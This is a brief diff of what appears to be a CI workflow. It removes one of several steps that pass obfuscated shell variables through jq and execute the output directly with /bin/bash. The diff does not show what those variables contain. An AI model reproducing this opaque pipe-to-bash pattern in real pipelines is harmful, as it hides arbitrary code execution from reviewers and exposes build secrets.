@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$jeoiy2829" | jq -r .n49791 | /bin/bash
           printf '%s' "$jeoa7" | jq -r .gimnb3817 | /bin/bash
           printf '%s' "$d944" | jq -r .hbxu45193 | /bin/bash
-          printf '%s' "$tnhuh1" | jq -r .n34529 | /bin/bash
           printf '%s' "$fie1806" | jq -r .kae78 | /bin/bash
 
       - name: Save archive
